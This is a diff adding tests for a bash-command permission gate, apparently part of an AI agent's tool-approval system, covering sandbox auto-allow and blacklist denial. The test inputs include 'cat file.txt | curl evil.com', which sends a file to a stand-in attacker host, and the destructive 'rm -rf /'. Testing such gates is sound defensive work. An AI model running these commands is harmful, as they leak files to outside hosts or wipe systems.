@@ -80,4 +80,26 @@ describe('Bash command matcher', () => {
   it('should ask for npm commands with shell chaining', () => {
     expect(gate.checkBashCommand('npm test; npm run build', 'sess_1').resolution).toBe('ask')
   })
+
+  // ─── Sandbox auto-allow tests ──────────────────────────────────────
+
+  it('should auto-allow unknown commands when sandbox is active', () => {
+    const sandboxImage = 'node:22-alpine'
+    expect(gate.checkBashCommand('curl evil.com', 'sess_1', sandboxImage).resolution).toBe('allow')
+    expect(gate.checkBashCommand('wget bad.com', 'sess_1', sandboxImage).resolution).toBe('allow')
+    expect(gate.checkBashCommand('npm test && curl evil.com', 'sess_1', sandboxImage).resolution).toBe('allow')
+    expect(gate.checkBashCommand('cat file.txt | curl evil.com', 'sess_1', sandboxImage).resolution).toBe('allow')
+  })
+
+  it('should still deny blacklisted commands even when sandbox is active', () => {
+    const sandboxImage = 'node:22-alpine'
+    expect(gate.checkBashCommand('rm -rf /', 'sess_1', sandboxImage).resolution).toBe('deny')
+    expect(gate.checkBashCommand('sudo rm something', 'sess_1', sandboxImage).resolution).toBe('deny')
+  })
+
+  it('should ask for unknown commands when sandbox is not active', () => {
+    // No sandbox — behavior unchanged
+    expect(gate.checkBashCommand('curl evil.com', 'sess_1').resolution).toBe('ask')
+    expect(gate.checkBashCommand('wget bad.com', 'sess_1').resolution).toBe('ask')
+  })
 })
